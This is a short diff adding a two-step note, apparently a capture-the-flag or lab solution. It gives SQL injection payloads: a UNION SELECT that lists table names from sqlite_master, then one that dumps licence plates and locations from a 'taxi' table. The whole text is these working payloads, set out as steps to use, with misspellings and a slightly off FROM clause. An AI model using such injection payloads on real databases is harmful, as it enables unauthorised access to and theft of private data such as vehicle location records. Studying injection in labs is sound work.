@@ -1,0 +1,2 @@
+1) Use "' UNION SELECT 1, GROUP_CONCAT(table_name),2 FROM sqlite_master.tbl_name --" to get table name
+2) Use "' UNION SELECT 1, GROUP_CONCAT(lisence_plate,location),2 FROM taxi --" to get location with the lisence plate
